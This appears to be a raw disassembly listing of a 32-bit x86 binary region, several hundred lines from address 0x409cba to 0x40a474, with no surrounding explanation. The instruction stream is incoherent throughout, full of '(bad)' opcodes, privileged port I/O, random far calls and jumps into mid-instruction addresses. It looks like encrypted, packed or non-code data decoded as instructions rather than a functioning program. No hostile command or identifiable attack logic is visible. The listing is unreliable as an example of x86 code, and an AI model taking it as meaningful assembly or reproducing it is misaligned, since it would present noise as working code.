  409cba:	test   BYTE PTR [ebp+0x2bb74241],cl
  409cc0:	cwde   
  409cc1:	int    0xd
  409cc3:	mov    edx,0xa74b60d4
  409cc8:	nop
  409cc9:	and    al,BYTE PTR [ecx]
  409ccb:	cdq    
  409ccc:	add    dl,dl
  409cce:	test   edx,0x222bef71
  409cd4:	and    eax,0x5aee0bb5
  409cd9:	cmc    
  409cda:	out    dx,al
  409cdb:	stos   DWORD PTR es:[edi],eax
  409cdc:	(bad)  
  409cdd:	sti    
  409cde:	dec    ebp
  409cdf:	cmp    edi,DWORD PTR [edi+0x24288152]
  409ce5:	call   0x1a3f0b9
  409cea:	(bad)  
  409ceb:	sub    edi,DWORD PTR [esp+eiz*8+0xa]
  409cef:	stos   DWORD PTR es:[edi],eax
  409cf0:	pop    eax
  409cf1:	inc    ebx
  409cf2:	jl     0x409d31
  409cf4:	jmp    0x1e923ad1
  409cf9:	nop
  409cfa:	test   DWORD PTR [edi-0x60cf2fdd],ebx
  409d00:	or     ebx,DWORD PTR [edi]
  409d02:	or     eax,0xb540a670
  409d07:	call   0xcc3f:0x3a50b082
  409d0e:	lea    ebp,[ebx-0x51]
  409d11:	ror    BYTE PTR [ebp+0x6f],cl
  409d14:	repz sar BYTE PTR [ecx-0x4d34d7f9],0xf2
  409d1c:	faddp  st(7),st
  409d1e:	and    esp,edx
  409d20:	loop   0x409d32
  409d22:	pusha  
  409d23:	or     al,0x0
  409d25:	icebp  
  409d26:	mov    ebx,0xd184924c
  409d2b:	push   0xe63c78c4
  409d30:	mov    edi,DWORD PTR [edi-0xc]
  409d33:	sbb    al,0x99
  409d35:	out    dx,al
  409d36:	repz rol BYTE PTR [ebx-0x71],1
  409d3a:	xor    edx,ebx
  409d3c:	cmp    cl,BYTE PTR [ebp+0x7f]
  409d3f:	mov    eax,0x785a4a83
  409d44:	pop    ss
  409d45:	adc    esi,DWORD PTR ds:0xb576242b
  409d4b:	inc    esp
  409d4c:	(bad)  
  409d4d:	sbb    al,BYTE PTR [ebx+0x99352c1]
  409d53:	(bad)  
  409d54:	aaa    
  409d55:	mov    dh,0x7
  409d57:	and    bl,BYTE PTR [ebx+0x39]
  409d5a:	add    bl,ah
  409d5c:	sbb    al,0x80
  409d5e:	shl    bh,cl
  409d60:	add    al,ch
  409d62:	xchg   edx,eax
  409d63:	push   esp
  409d64:	int3   
  409d65:	nop
  409d66:	inc    edx
  409d67:	mov    ds:0x4fa07d75,al
  409d6c:	int3   
  409d6d:	pop    esi
  409d6e:	(bad)  
  409d6f:	jecxz  0x409d62
  409d71:	stos   BYTE PTR es:[edi],al
  409d72:	popa   
  409d73:	rol    BYTE PTR [eax],0x6f
  409d76:	std    
  409d77:	cli    
  409d78:	scas   eax,DWORD PTR es:[edi]
  409d79:	(bad)  
  409d7a:	jp     0x409d55
  409d7c:	fdivr  QWORD PTR [eax+0x3f]
  409d7f:	in     al,0x58
  409d81:	add    BYTE PTR [eax],ah
  409d83:	test   al,bh
  409d85:	lahf   
  409d86:	lods   al,BYTE PTR ds:[esi]
  409d87:	mov    ch,0xed
  409d89:	shr    DWORD PTR [eax-0x3c],1
  409d8c:	jo     0x409dc6
  409d8e:	in     al,0xf0
  409d90:	lock adc BYTE PTR [ecx],ch
  409d93:	and    eax,0xfeeffb7f
  409d98:	cmp    eax,0xbf018306
  409d9d:	(bad)  
  409d9e:	stos   DWORD PTR es:[edi],eax
  409d9f:	mov    edi,0xe13264c2
  409da4:	fidiv  DWORD PTR [ebp+0x6ff6fc6b]
  409daa:	push   DWORD PTR [esi]
  409dac:	mov    edi,0xcbbfbbfb
  409db1:	aas    
  409db2:	jmp    edi
  409db4:	call   FWORD PTR [edi+ecx*4-0x9961383]
  409dbb:	div    dh
  409dbd:	sub    edx,esi
  409dbf:	mov    ecx,gs
  409dc1:	in     al,0x90
  409dc3:	and    cl,bh
  409dc5:	cmp    eax,0xbe942fca
  409dca:	sub    BYTE PTR [ebx+esi*4],dh
  409dcd:	stc    
  409dce:	pushf  
  409dcf:	jns    0x409d67
  409dd1:	jnp    0x409df7
  409dd3:	je     0x409d6a
  409dd5:	mov    ah,0x68
  409dd7:	or     bh,al
  409dd9:	mov    ds:0xbb9277f6,eax
  409dde:	add    DWORD PTR [ebx-0x38],0x5ab5eac6
  409de5:	test   BYTE PTR [eax+eiz*4],al
  409de8:	jo     0x409e19
  409dea:	xchg   ebx,eax
  409deb:	pop    ecx
  409dec:	shl    ecx,0xd4
  409def:	sub    DWORD PTR [ecx+0x202f2e14],ebp
  409df5:	dec    esp
  409df6:	and    DWORD PTR [ebp-0xd],edx
  409df9:	in     al,dx
  409dfa:	pop    edx
  409dfb:	ror    BYTE PTR [edx+0x4d2ffb2a],0x5
  409e02:	std    
  409e03:	pop    esi
  409e04:	dec    edx
  409e05:	scas   eax,DWORD PTR es:[edi]
  409e06:	fwait
  409e07:	xor    BYTE PTR [esi],bh
  409e09:	sub    al,0xc8
  409e0b:	ret    
  409e0c:	xor    BYTE PTR [ecx+0xc],ah
  409e0f:	fadd   st,st(2)
  409e11:	jne    0x409e30
  409e13:	inc    edx
  409e14:	js     0x409e71
  409e16:	pop    ebx
  409e17:	loope  0x409e93
  409e19:	(bad)  
  409e1a:	(bad)  
  409e1b:	cmp    eax,0x96589ee6
  409e20:	ret    
  409e21:	jnp    0x409e70
  409e23:	push   ss
  409e24:	adc    dl,cl
  409e26:	adc    DWORD PTR [ebp-0x5dff0595],edx
  409e2c:	std    
  409e2d:	inc    edi
  409e2e:	cmp    dl,BYTE PTR [edx]
  409e30:	jecxz  0x409dee
  409e32:	xor    al,0x1d
  409e35:	ret    0x41ec
  409e38:	(bad)  
  409e39:	pop    edx
  409e3a:	(bad)  
  409e3b:	shl    BYTE PTR [esp+esi*8+0x7f3805eb],cl
  409e42:	inc    eax
  409e43:	push   ecx
  409e44:	pop    eax
  409e45:	je     0x409e70
  409e47:	rol    BYTE PTR [esi],1
  409e49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e4a:	mov    ch,0x9e
  409e4c:	cmp    BYTE PTR [eax+0x6e0f8eeb],bh
  409e52:	inc    eax
  409e53:	jno    0x409dd6
  409e55:	(bad)  
  409e56:	lahf   
  409e57:	cmp    BYTE PTR [ecx+0x789b7ef6],cl
  409e5d:	push   ecx
  409e5e:	int3   
  409e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e60:	mov    ds:0x4d080c7,al
  409e65:	add    cl,0x60
  409e68:	adc    BYTE PTR [eax],0x82
  409e6b:	das    
  409e6c:	jle    0x409e67
  409e6e:	jmp    0x409ecc
  409e70:	mov    ebx,0x23e0f25d
  409e75:	dec    edi
  409e76:	mov    dl,0xbd
  409e78:	jae    0x409e10
  409e7a:	loope  0x409e64
  409e7c:	add    al,0x69
  409e7e:	shr    BYTE PTR [ecx-0x552a0f9b],cl
  409e84:	sub    BYTE PTR [edx-0x741b6a46],ch
  409e8a:	inc    esi
  409e8b:	xchg   ebp,eax
  409e8c:	test   BYTE PTR [esi-0x4f],dh
  409e8f:	bound  ebx,QWORD PTR [ebx+0x5c]
  409e92:	mov    esi,0x8bd00916
  409e97:	pushf  
  409e98:	add    BYTE PTR [ecx+eax*2+0x27],ch
  409e9c:	lods   eax,DWORD PTR ds:[esi]
  409e9d:	inc    edi
  409e9e:	mov    ah,0x56
  409ea0:	add    eax,0x6501c1c1
  409ea6:	pop    ecx
  409ea7:	test   DWORD PTR cs:[esi-0x5054547f],ebx
  409eae:	cli    
  409eaf:	into   
  409eb0:	in     eax,0xb8
  409eb2:	es inc eax
  409eb4:	iret   
  409eb5:	sbb    bl,al
  409eb7:	leave  
  409eb8:	xchg   ebx,eax
  409eb9:	daa    
  409eba:	jns    0x409eb6
  409ebc:	jmp    0x7057c68
  409ec1:	(bad)  
  409ec2:	xor    eax,0x43fdbdc8
  409ec7:	sahf   
  409ec8:	jl     0x409ebc
  409eca:	dec    ecx
  409ecb:	scas   al,BYTE PTR es:[edi]
  409ecc:	pop    esi
  409ecd:	mov    ebp,0xcedbedca
  409ed2:	popa   
  409ed3:	jns    0x409ec2
  409ed5:	fidiv  DWORD PTR ds:0xf93fc9fe
  409edb:	daa    
  409edc:	cld    
  409edd:	(bad)  
  409ede:	outs   dx,DWORD PTR ds:[esi]
  409edf:	std    
  409ee0:	push   ss
  409ee1:	dec    edi
  409ee2:	cmp    eax,0x7b0714f5
  409ee7:	mov    bh,0xc9
  409ee9:	xor    dh,BYTE PTR [edi]
  409eeb:	fnsave [ecx-0x57]
  409eee:	xor    eax,0x273a5945
  409ef3:	pop    esi
  409ef4:	pop    esi
  409ef5:	nop
  409ef6:	out    0x45,eax
  409ef8:	lods   eax,DWORD PTR ds:[esi]
  409ef9:	pop    es
  409efa:	cmp    BYTE PTR [esi+0x40121f2d],ch
  409f00:	push   esi
  409f01:	jp     0x409ef9
  409f03:	out    dx,eax
  409f04:	test   esi,esi
  409f06:	pop    es
  409f07:	pop    es
  409f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f0a:	bound  ebx,QWORD PTR [ecx-0x6a]
  409f0d:	xor    eax,ebx
  409f0f:	pop    eax
  409f10:	lods   al,BYTE PTR ds:[esi]
  409f11:	and    esp,DWORD PTR [edi+0x71]
  409f14:	and    eax,eax
  409f16:	stc    
  409f17:	mov    esp,0x713f7f60
  409f1c:	or     al,0x5c
  409f1e:	dec    edx
  409f1f:	xchg   edi,eax
  409f20:	add    esp,DWORD PTR [eax+0x42aaab5c]
  409f26:	dec    esp
  409f27:	sbb    BYTE PTR [eax],dh
  409f29:	jle    0x409f3d
  409f2b:	push   ecx
  409f2c:	(bad)  
  409f2e:	xchg   esp,eax
  409f2f:	jb     0x409eda
  409f31:	rol    ebx,0x8d
  409f34:	push   ss
  409f35:	pop    es
  409f36:	jecxz  0x409f14
  409f38:	mov    cl,0x80
  409f3a:	add    BYTE PTR [esi-0x3f083021],0x31
  409f41:	xor    BYTE PTR [eax],cl
  409f43:	in     eax,0x18
  409f45:	adc    cl,0x9e
  409f48:	mov    esi,0xbe36161b
  409f4d:	stos   BYTE PTR es:[edi],al
  409f4e:	iret   
  409f4f:	mov    esi,0xb1e16b51
  409f54:	test   eax,0x2c4db440
  409f59:	scas   al,BYTE PTR es:[edi]
  409f5a:	ret    
  409f5b:	stos   BYTE PTR es:[edi],al
  409f5c:	dec    eax
  409f5d:	inc    edx
  409f5e:	push   ebp
  409f5f:	mov    ds:0x3413c62c,eax
  409f64:	fld    DWORD PTR [ebp+0x3846e104]
  409f6a:	pop    edx
  409f6b:	sub    edx,eax
  409f6d:	ficom  DWORD PTR [eax+0x2c16a17]
  409f73:	jb     0x409fb6
  409f75:	pop    esi
  409f76:	or     BYTE PTR [edx+0x2d],cl
  409f79:	nop
  409f7a:	jle    0x409fbd
  409f7c:	mov    DWORD PTR gs:0xdfec26cf,esp
  409f83:	jp     0x409f16
  409f85:	daa    
  409f86:	push   ds
  409f87:	jmp    0x98f80e5c
  409f8c:	int    0x66
  409f8e:	xchg   ebp,eax
  409f8f:	jecxz  0x409f40
  409f91:	fxch   st(3)
  409f93:	aaa    
  409f94:	add    DWORD PTR [eax],esp
  409f96:	(bad)  
  409f97:	sbb    eax,0xd3a76798
  409f9c:	loope  0x409fe9
  409f9e:	pop    edi
  409f9f:	(bad)  
  409fa0:	adc    edi,DWORD PTR [esi+0x4e2ddaff]
  409fa6:	aas    
  409fa7:	lock jle 0x40a020
  409faa:	dec    esi
  409fab:	ds enter 0xfb68,0x34
  409fb0:	lods   eax,DWORD PTR ds:[esi]
  409fb1:	dec    esi
  409fb2:	fbld   TBYTE PTR ds:0xc7e5e8fa
  409fb8:	stos   BYTE PTR es:[edi],al
  409fb9:	hlt    
  409fba:	cmp    al,0x6
  409fbc:	cmp    DWORD PTR [eax+0x67],0xf9616090
  409fc3:	out    dx,eax
  409fc4:	inc    edi
  409fc5:	cli    
  409fc6:	push   edi
  409fc7:	inc    ebp
  409fc8:	add    DWORD PTR [ecx],0x58
  409fcb:	out    dx,eax
  409fcc:	or     esi,DWORD PTR [eax-0x65bfacf5]
  409fd2:	sub    DWORD PTR [edi+0x49247a77],esp
  409fd8:	mov    dh,BYTE PTR [ebp-0x14450ba7]
  409fde:	in     eax,dx
  409fdf:	jno    0x409fb6
  409fe1:	dec    esp
  409fe2:	rcr    BYTE PTR [esi-0x22],0x5c
  409fe6:	mov    ch,0xf1
  409fe8:	jle    0x409fb2
  409fea:	cmp    eax,0x3ec7c003
  409fef:	div    BYTE PTR [ecx-0x21f527ec]
  409ff5:	retf   0x7c2f
  409ff8:	loope  0x40a005
  409ffa:	fs pop ecx
  409ffc:	inc    esi
  409ffd:	mov    edi,0x9fe3e03f
  40a002:	clc    
  40a003:	jns    0x40a07f
  40a005:	fnstsw WORD PTR [esi]
  40a007:	dec    edi
  40a008:	ds stc 
  40a00a:	and    al,0x9f
  40a00c:	cld    
  40a00d:	in     al,0x27
  40a00f:	(bad)  
  40a011:	aas    
  40a012:	loopne 0x409fd9
  40a014:	pop    ss
  40a015:	mov    edi,0xbeafabc3
  40a01a:	retf   0xafeb
  40a01d:	mov    edi,0x97fcbfce
  40a022:	call   DWORD PTR [edx-0x1d00e81]
  40a028:	add    eax,0xed725979
  40a02d:	cli    
  40a02e:	int    0x5a
  40a030:	fisubr DWORD PTR ds:0xed447788
  40a036:	fild   QWORD PTR [ecx-0x539a383e]
  40a03c:	jg     0x409ff9
  40a03e:	add    bh,BYTE PTR [edi+ebp*4-0x12]
  40a042:	mov    bh,0xe3
  40a044:	fiadd  DWORD PTR [eax-0x5e]
  40a047:	adc    al,0x7
  40a049:	pop    es
  40a04a:	push   ebx
  40a04b:	test   BYTE PTR [edi],0xdc
  40a04e:	adc    BYTE PTR [ebp+0x29],dl
  40a051:	pop    ebp
  40a052:	adc    dl,BYTE PTR [eax-0x758a3d6e]
  40a058:	ss int3 
  40a05a:	sub    dl,BYTE PTR [esp+ebp*2]
  40a05d:	ja     0x40a060
  40a05f:	enter  0xd1aa,0x74
  40a063:	mov    ebx,0x36a39b09
  40a068:	sti    
  40a069:	pop    es
  40a06a:	cmp    ebx,esp
  40a06c:	ret    
  40a06d:	add    bl,BYTE PTR [ebp-0x3a]
  40a070:	fst    QWORD PTR [edx+0x6c]
  40a073:	xchg   ebx,eax
  40a074:	aaa    
  40a075:	arpl   bx,di
  40a077:	ficom  WORD PTR [eax+esi*4-0x48]
  40a07b:	xor    dl,BYTE PTR [ebp-0x56]
  40a07e:	call   0xf121:0x4c712304
  40a085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a086:	inc    esp
  40a087:	ret    0xc7b2
  40a08a:	sahf   
  40a08b:	cmp    cl,BYTE PTR [eax]
  40a08d:	push   esp
  40a08e:	mov    edi,0x5405e457
  40a093:	loopne 0x40a0a5
  40a095:	stc    
  40a096:	or     ch,BYTE PTR [edx-0x4e3cf887]
  40a09c:	inc    ecx
  40a09d:	sbb    ecx,DWORD PTR [edi+ecx*2-0x7aebedfa]
  40a0a4:	gs ds ja 0x40a0d3
  40a0a8:	push   es
  40a0a9:	int    0xe6
  40a0ab:	xchg   BYTE PTR [eax+edx*4+0x75a594],bh
  40a0b2:	sub    DWORD PTR [esi+eax*1],ebp
  40a0b5:	mov    eax,0x9c7bfd75
  40a0ba:	cmp    esp,DWORD PTR ds:0xd51adad8
  40a0c0:	inc    esi
  40a0c1:	clc    
  40a0c2:	lds    edi,FWORD PTR ds:0xbc942c3f
  40a0c8:	cdq    
  40a0c9:	icebp  
  40a0ca:	pop    ss
  40a0cb:	(bad)  
  40a0cc:	daa    
  40a0cd:	dec    ecx
  40a0ce:	ret    0x3870
  40a0d1:	in     al,0x85
  40a0d3:	pop    ss
  40a0d4:	pop    esi
  40a0d5:	in     al,0x6b
  40a0d7:	iret   
  40a0d8:	mov    esi,0x71e770cc
  40a0dd:	mov    dh,0x4f
  40a0df:	ds (bad) 
  40a0e1:	(bad)  
  40a0e2:	lock and al,0xad
  40a0e5:	push   esi
  40a0e6:	mov    edi,0xa477b596
  40a0eb:	cmp    eax,0x62d15e1f
  40a0f0:	rcl    DWORD PTR [edx-0x493d9fc7],cl
  40a0f6:	xchg   BYTE PTR [esi-0x2a],cl
  40a0f9:	into   
  40a0fa:	sbb    DWORD PTR [ecx+0x3ffc7100],ebx
  40a100:	into   
  40a101:	add    DWORD PTR [eax],edx
  40a103:	jbe    0x40a0cf
  40a105:	push   0x55df4ce0
  40a10a:	or     al,0x20
  40a10c:	cld    
  40a10d:	bound  ebx,QWORD PTR ds:[edx]
  40a110:	xor    BYTE PTR [eax-0x4392a929],al
  40a116:	pop    ds
  40a117:	jb     0x40a135
  40a119:	push   es
  40a11a:	and    BYTE PTR [ecx-0x5f6847d2],al
  40a120:	mov    ch,0xf6
  40a122:	xor    DWORD PTR ds:0x61851426,0x2f
  40a129:	aas    
  40a12a:	loopne 0x40a10b
  40a12c:	(bad)  
  40a12d:	sti    
  40a12e:	inc    eax
  40a130:	into   
  40a131:	into   
  40a132:	ss aas 
  40a134:	sti    
  40a135:	mov    bl,0x3f
  40a137:	(bad)  
  40a138:	das    
  40a139:	(bad)  
  40a13a:	loop   0x40a16b
  40a13c:	icebp  
  40a13d:	int3   
  40a13e:	xor    ecx,edi
  40a140:	lock sti 
  40a142:	mov    edi,0xf6f679ff
  40a147:	imul   BYTE PTR [eax]
  40a149:	retf   
  40a14a:	xchg   edx,eax
  40a14b:	jmp    0x79026fc4
  40a150:	inc    edx
  40a151:	xchg   edx,eax
  40a152:	sub    al,0x53
  40a154:	mov    ebp,0x4528e4a3
  40a159:	cmp    eax,0xe51fba8a
  40a15e:	or     al,0xbc
  40a160:	pop    ss
  40a161:	ror    BYTE PTR [eax],0xdf
  40a164:	retf   
  40a165:	mov    ds:0x28924920,al
  40a16a:	pop    es
  40a16b:	xbegin 0x790604a5
  40a171:	pushf  
  40a172:	xor    DWORD PTR [ebx+0x12000f0b],ebx
  40a178:	and    DWORD PTR [ebp+0x54],eax
  40a17b:	into   
  40a17c:	xor    eax,0x5ee9caf4
  40a181:	pop    ebx
  40a182:	sub    dl,BYTE PTR [edi-0x70]
  40a185:	es xchg edx,eax
  40a187:	outs   dx,BYTE PTR ds:[esi]
  40a188:	inc    edi
  40a189:	xor    eax,ebp
  40a18b:	and    eax,0x2c8a5ab4
  40a190:	das    
  40a191:	fsub   QWORD PTR [ecx+eiz*4-0x69e28bb5]
  40a198:	xor    bh,cl
  40a19a:	push   0x14
  40a19c:	lahf   
  40a19d:	test   al,0xbc
  40a19f:	jne    0x40a1ed
  40a1a1:	mov    eax,ds:0x7d170902
  40a1a6:	pop    eax
  40a1a7:	repnz sub ecx,eax
  40a1aa:	pusha  
  40a1ab:	pop    edx
  40a1ac:	and    al,0xd4
  40a1ae:	inc    edi
  40a1af:	push   cs
  40a1b0:	push   esi
  40a1b1:	xchg   ebp,eax
  40a1b2:	mov    al,0xf8
  40a1b4:	ins    DWORD PTR es:[edi],dx
  40a1b5:	sub    eax,0x978899b5
  40a1ba:	sbb    al,0x82
  40a1bc:	mov    ebx,esp
  40a1be:	add    al,0x5b
  40a1c0:	cmp    DWORD PTR [esi+0x7d],esp
  40a1c3:	push   edx
  40a1c4:	push   eax
  40a1c5:	and    esp,edi
  40a1c7:	mov    al,ds:0x58753720
  40a1cc:	pop    edx
  40a1cd:	adc    BYTE PTR [esi],0x82
  40a1d0:	fstp   QWORD PTR [ebx]
  40a1d2:	fbld   TBYTE PTR [ebx-0x55]
  40a1d5:	jg     0x40a197
  40a1d7:	inc    ebx
  40a1d8:	setl   BYTE PTR [ecx-0x2cb2c416]
  40a1df:	xchg   ebp,eax
  40a1e0:	cmp    eax,0x9a2edc7d
  40a1e5:	shl    BYTE PTR [eax+0x18306294],0x70
  40a1ec:	loope  0x40a1d0
  40a1ee:	and    eax,0x9e0fef7e
  40a1f3:	and    eax,0xc4e69f69
  40a1f8:	jmp    0x9d597b44
  40a1fd:	mov    ds:0xac611bd3,al
  40a202:	pop    esp
  40a203:	fdivr  QWORD PTR [edx+0x34]
  40a206:	mov    al,0xb2
  40a208:	data16 (bad) 
  40a20a:	sti    
  40a20b:	jmp    0xde3b:0xb47e3dae
  40a212:	pop    eax
  40a213:	or     esp,DWORD PTR [esi+0x22d502f8]
  40a219:	test   al,0x51
  40a21b:	loope  0x40a1f7
  40a21d:	cmp    al,0x80
  40a21f:	mov    edx,0x398a040e
  40a224:	inc    edx
  40a225:	sub    al,0x56
  40a227:	std    
  40a228:	pop    ecx
  40a229:	inc    ebp
  40a22a:	inc    DWORD PTR [ebx-0x4bbd4627]
  40a230:	adc    dl,ah
  40a232:	pop    ebp
  40a233:	sbb    DWORD PTR [ecx],ecx
  40a235:	or     bh,al
  40a237:	aaa    
  40a238:	add    DWORD PTR [esp+edx*8],esi
  40a23b:	jmp    0xa2c336f2
  40a240:	pop    esp
  40a241:	xor    al,0xe0
  40a243:	repz out 0xcf,eax
  40a246:	push   ebx
  40a247:	adc    al,0x5
  40a249:	(bad)  
  40a24b:	hlt    
  40a24c:	adc    ch,ch
  40a24e:	mov    dh,0x9b
  40a250:	and    eax,0xcb3abeb7
  40a255:	popf   
  40a256:	xchg   ebp,eax
  40a257:	(bad)  
  40a258:	in     eax,dx
  40a259:	cmp    ch,bh
  40a25b:	out    dx,al
  40a25c:	(bad)  
  40a25d:	rcr    edi,cl
  40a25f:	jmp    0x40a2d2
  40a261:	(bad)  
  40a262:	pop    edx
  40a263:	out    0x59,al
  40a265:	out    0x12,al
  40a267:	(bad)  
  40a268:	and    ah,BYTE PTR [ebp-0x5b6dbf50]
  40a26e:	in     al,dx
  40a26f:	(bad)  
  40a270:	out    0xd8,eax
  40a272:	pop    esp
  40a273:	mov    al,ds:0xa72fce7a
  40a278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a279:	pop    ds
  40a27a:	push   es
  40a27b:	dec    esp
  40a27c:	pusha  
  40a27d:	add    BYTE PTR [ecx-0x6c27782e],dl
  40a283:	pop    ds
  40a284:	loop   0x40a2b1
  40a286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a287:	mov    al,ds:0xf5e84ed3
  40a28c:	push   ebx
  40a28d:	fisubr DWORD PTR ds:0x2e9644c5
  40a293:	cmp    DWORD PTR [ebp+0x78974bc9],esp
  40a299:	es jno 0x40a23d
  40a29c:	clc    
  40a29d:	popw   ss
  40a29f:	pop    ebp
  40a2a0:	push   edi
  40a2a1:	sub    eax,0x66a965c6
  40a2a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2a7:	test   al,0x9c
  40a2a9:	jg     0x40a23c
  40a2ab:	adc    DWORD PTR [ecx+0x78],0xffffff96
  40a2af:	and    BYTE PTR [ebx],dl
  40a2b1:	and    BYTE PTR [ebp-0x50],bl
  40a2b4:	pop    es
  40a2b5:	inc    ebx
  40a2b6:	and    ebp,ebx
  40a2b8:	and    eax,0x32222266
  40a2bd:	daa    
  40a2be:	cld    
  40a2bf:	cmp    eax,0x6245834a
  40a2c4:	mov    ch,0x41
  40a2c6:	xchg   edi,eax
  40a2c7:	outs   dx,BYTE PTR ds:[esi]
  40a2c8:	mov    ds:0x2a0bcd0,al
  40a2cd:	add    BYTE PTR [ebp+0x5a],bl
  40a2d0:	retf   0x3044
  40a2d3:	fnstcw WORD PTR [ebp-0x1ea1a4bc]
  40a2d9:	mov    cl,0x47
  40a2db:	dec    esi
  40a2dc:	mov    al,ds:0x5d52aa94
  40a2e1:	fwait
  40a2e2:	retf   0x547d
  40a2e5:	iret   
  40a2e6:	pop    ds
  40a2e7:	jle    0x40a2f0
  40a2e9:	in     eax,0x9f
  40a2eb:	dec    esp
  40a2ec:	es jl  0x40a2dd
  40a2ef:	idiv   DWORD PTR [esi-0x1a299e36]
  40a2f5:	rol    DWORD PTR [edi-0x22],0xc3
  40a2f9:	(bad)  
  40a2fa:	out    0x69,al
  40a2fc:	cli    
  40a2fd:	sub    DWORD PTR ds:0xc0dc4884,0xffffff9d
  40a304:	push   eax
  40a305:	gs fdivrp st(7),st
  40a308:	pop    ecx
  40a309:	arpl   si,si
  40a30b:	lea    edi,[ecx+0xa]
  40a30e:	push   edi
  40a30f:	cmp    DWORD PTR [ecx],eax
  40a311:	inc    ebp
  40a312:	mov    ah,0x3f
  40a314:	scas   al,BYTE PTR es:[edi]
  40a315:	imul   dl
  40a317:	adc    eax,0x9917f85
  40a31c:	push   ecx
  40a31d:	sub    DWORD PTR [edi-0x47],edi
  40a320:	enter  0x801,0x8c
  40a324:	mov    al,ds:0x70c149f
  40a329:	pop    ebp
  40a32a:	dec    edx
  40a32b:	mov    ebp,0x7c10023a
  40a330:	add    ecx,ebp
  40a332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a333:	int    0xfc
  40a335:	repz iret 
  40a337:	jns    0x40a2d0
  40a339:	xchg   BYTE PTR [edx],al
  40a33b:	ret    
  40a33c:	xor    DWORD PTR [eax],eax
  40a33e:	inc    eax
  40a33f:	or     BYTE PTR [ecx+0x38a08d80],ah
  40a345:	xor    DWORD PTR [edx+0x60738515],ecx
  40a34b:	add    eax,0x9a230f54
  40a350:	jp     0x40a30f
  40a352:	push   ds
  40a353:	imul   ebx,DWORD PTR [edx-0x7070e1ce],0x2f74e51c
  40a35d:	mov    bh,BYTE PTR [esi-0x41]
  40a360:	retf   0xbde
  40a363:	sbb    BYTE PTR [eax],ch
  40a365:	sub    DWORD PTR [ecx+0x52],edx
  40a368:	mov    ds:0xbcf85a95,al
  40a36d:	jge    0x40a3a7
  40a36f:	or     ah,BYTE PTR [ecx-0x47]
  40a372:	jp     0x40a3e9
  40a374:	pop    ds
  40a375:	mov    ds:0xe1008905,eax
  40a37a:	ret    
  40a37b:	and    cl,0x9c
  40a37e:	mov    BYTE PTR [eax+0x215f2190],0x6e
  40a385:	jns    0x40a405
  40a387:	inc    esi
  40a388:	and    BYTE PTR [ebx],cl
  40a38a:	lods   eax,DWORD PTR ds:[esi]
  40a38b:	xchg   esi,eax
  40a38c:	cmp    BYTE PTR fs:[eax+0x19],cl
  40a390:	hlt    
  40a391:	push   ebx
  40a392:	push   cs
  40a393:	ud2    
  40a395:	out    0x5a,al
  40a397:	arpl   WORD PTR [ebp+0x48],bp
  40a39a:	xchg   ebp,eax
  40a39b:	mov    ebp,DWORD PTR [edi+esi*8-0x60]
  40a39f:	test   BYTE PTR [esi+0x46],dl
  40a3a2:	sub    eax,0x5408057a
  40a3a7:	ss mov ecx,0x6c43a5ef
  40a3ad:	stos   BYTE PTR es:[edi],al
  40a3ae:	jmp    0x9bda:0xbe21e3b5
  40a3b5:	add    al,0x85
  40a3b7:	pop    es
  40a3b8:	mov    BYTE PTR [edx],al
  40a3ba:	fs out 0x8e,al
  40a3bd:	(bad)  
  40a3be:	cmp    edi,ebx
  40a3c0:	mov    WORD PTR [edi],es
  40a3c2:	pop    es
  40a3c3:	ret    0x9b1
  40a3c6:	push   ebp
  40a3c7:	sub    bl,BYTE PTR [edi-0x10]
  40a3ca:	inc    edi
  40a3cb:	or     BYTE PTR [edi+0x76],ah
  40a3ce:	pop    eax
  40a3cf:	xchg   ebx,eax
  40a3d0:	and    BYTE PTR [edi+ebx*4+0x6e30b027],dl
  40a3d7:	xor    BYTE PTR [eax+0x26],dl
  40a3da:	cdq    
  40a3db:	addr16 mov eax,0x942501b1
  40a3e1:	jecxz  0x40a440
  40a3e3:	in     al,dx
  40a3e4:	cld    
  40a3e5:	sti    
  40a3e6:	jl     0x40a3d0
  40a3e8:	inc    ebx
  40a3e9:	daa    
  40a3ea:	call   0xe5769fe6
  40a3ef:	xchg   DWORD PTR ds:0x6055fb5,eax
  40a3f5:	inc    ecx
  40a3f6:	ret    0x6eef
  40a3f9:	xlat   BYTE PTR ds:[ebx]
  40a3fa:	sub    eax,0x5f7bfec3
  40a3ff:	clc    
  40a400:	arpl   WORD PTR [esi],bp
  40a402:	pop    esp
  40a403:	leave  
  40a404:	cmp    bl,dh
  40a406:	rol    BYTE PTR [edi],0x18
  40a409:	ins    DWORD PTR es:[edi],dx
  40a40a:	sahf   
  40a40b:	mov    eax,ds:0xa946d83b
  40a410:	ss xchg ebp,eax
  40a412:	push   DWORD PTR [ebp-0x40e4b57]
  40a418:	pop    esi
  40a419:	xor    eax,0xa851aed0
  40a41e:	stos   BYTE PTR es:[edi],al
  40a41f:	mov    dl,0x88
  40a421:	mov    ebp,ss
  40a423:	call   0xc00c:0xf19b134d
  40a42a:	inc    esp
  40a42b:	jmp    0x40a42d
  40a42d:	cli    
  40a42e:	dec    ecx
  40a42f:	inc    eax
  40a430:	je     0x40a493
  40a432:	sbb    DWORD PTR [edx+esi*2-0x4b0c8ca],esi
  40a439:	and    DWORD PTR [edi+0x75],0xcb9c6047
  40a440:	ror    ah,1
  40a442:	jo     0x40a438
  40a444:	jb     0x40a45f
  40a446:	mov    eax,0xefaee2b1
  40a44b:	mov    ebx,DWORD PTR [edi+eax*4]
  40a44e:	add    DWORD PTR [eax+eax*8-0x2d7b4ff2],esp
  40a455:	test   DWORD PTR [ecx-0x6953261c],esi
  40a45b:	iret   
  40a45c:	ins    BYTE PTR es:[edi],dx
  40a45d:	lods   eax,DWORD PTR ds:[esi]
  40a45e:	or     edx,ebx
  40a460:	dec    eax
  40a461:	sub    DWORD PTR [ecx+0x18d5e7cf],ebx
  40a467:	out    0x55,eax
  40a469:	pandn  mm7,mm4
  40a46c:	jge    0x40a4a5
  40a46e:	cmp    edi,DWORD PTR [edi+0x1f194299]
  40a474:	mov    bl,0xca
